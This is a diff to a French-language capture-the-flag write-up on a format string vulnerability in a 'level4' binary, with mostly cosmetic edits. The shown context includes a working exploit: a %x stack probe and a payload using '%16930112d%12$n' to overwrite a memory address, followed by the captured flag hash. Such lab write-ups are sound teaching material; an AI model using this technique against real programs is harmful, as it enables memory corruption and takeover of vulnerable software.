@@ -34,7 +34,7 @@ void main(void)
 }
 ```
 
-Nous pouvons donc utiliser exactement la meme methode que l'exericse precedent a ceci pres que nous devons savoir quelle est la position de notre argument dans printf:
+Nous pouvons donc utiliser exactement la meme methode que l'exericse precedent a ceci pres que nous devons savoir quelle est la position de notre argument dans `printf()`:
 
 ```bash
 python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
@@ -47,6 +47,5 @@ Nous voyons donc notre `61616161` en 12eme position. Nous avons donc juste a mod
 (python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' ; cat) | ./level4
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
-
 
 Le `%16930112d` nous permet de dire au `%n` d'inserer directement cette valeur a l'adresse precisee
